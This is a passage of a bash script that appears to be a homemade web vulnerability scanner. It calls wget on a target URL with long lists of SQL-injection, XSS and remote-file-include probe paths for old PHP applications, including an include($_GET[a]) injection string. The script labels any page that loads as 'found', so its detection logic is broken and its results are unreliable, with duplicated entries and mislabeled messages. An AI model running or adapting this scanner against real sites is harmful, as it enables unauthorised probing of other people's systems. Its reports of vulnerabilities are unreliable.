wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productDetails.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productDisplay.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productlist.php?ViewType=Category&CategoryID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productinfo.php?item='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productpage.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products.php?keyword='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products_category.php?CategoryID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/products_detail.php?CategoryID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/productsByCategory.php?intCatalogID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/prodView.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/promo.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/promotion.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/pview.php?Item='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/resellers.php?idCategory='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/results.php?cat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/savecart.php?CartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/search.php?CartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/searchcat.php?search_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Select_Item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Services.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
else 
	echo "ws > sql not found"
fi
elif [ $a == -xss ]
then
echo "The search started if we found vulnerability we will tell you ......"

echo "---------------------------------------------------------------------"
d=".php?cmd="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?z="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?q="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?searche="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?query="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?searchstring="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?keyword="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?file="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php=years="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?txt="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?tag="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?max="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?from="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?from="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?pass="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=".php?feedback="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > xss found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
else
	echo "ws > xss not found"
fi
 elif [ $a == -fl ]
then
echo "The search started if we found vulnerability we will tell you ......"

echo "---------------------------------------------------------------------"
d="/classes.php?LOCAL_PATH="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "ws > remotefile include not found"
fi
 
d="/help_text_vars.php?dir&PGV_BASE_DIRECTORY="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/phpcoin/config.php?_CCFG[_PKG_PATH_DBSE]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/static.php?load="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/common.php?include_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/osticket/include/main.php?config[search_disp]=true&include_dir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/shoutbox/expanded.php?conf="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/templates/headline_temp.php?nst_inc="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/forum/admin/index.php?inc_conf="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/page=login/index.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/archive.php?CONFIG[script_path]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/paginedinamiche/main.php?pagind="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/folder.php?id="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/default.php?page=home"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="forums.html/modules.php?name="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/includes/orderSuccess.inc.php?glob="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/php?bodyfile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ihm.php?p=*"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ashnews.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ashnews.php?pathtoashnews="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/html&highlight=%2527.include($_GET[a]),exit.%2527&d="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="kietu/hit_js.php, allinurl:kietu/hit_js.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/kietu/index.php?kietu[url_hit]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/Popper/index.php?"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules.php?name=allmyguests"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/Popper/index.php?childwindow.inc.php?form="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/include/footer.inc.php?_AMLconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ihm.php?p="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d=""
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/4nAlbum/public/displayCategory.php?basepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/coppermine/themes/default/theme.php?THEME_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/My_eGallery/public/displayCategory.php?basepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?file="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?view="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?z="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?body="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?babInstallPath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index1.php?main="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index2.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?TWC="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?sec="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?TWC="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/temp_eg/phpgwapi/setup/tables_update.inc.php?appdir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/includes/header.php?systempath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/Gallery/displayCategory.php?basepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.inc.php?PATH_Includes="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ashnews.php?pathtoashnews="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/ashheadlines.php?pathtoashnews="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/demo/includes/init.php?user_inc="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/jaf/index.php?show="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/inc/shows.inc.php?cutepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/poll/admin/common.inc.php?base_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/pollvote/pollvote.php?pollname="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/sources/post.php?fil_config="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/My_eGallery/public/displayCategory.php?basepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/bb_lib/checkdb.inc.php?libpach="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/include/livre_include.php?no_connect=lol&chem_absolu="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?from_market=Y&pageurl="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
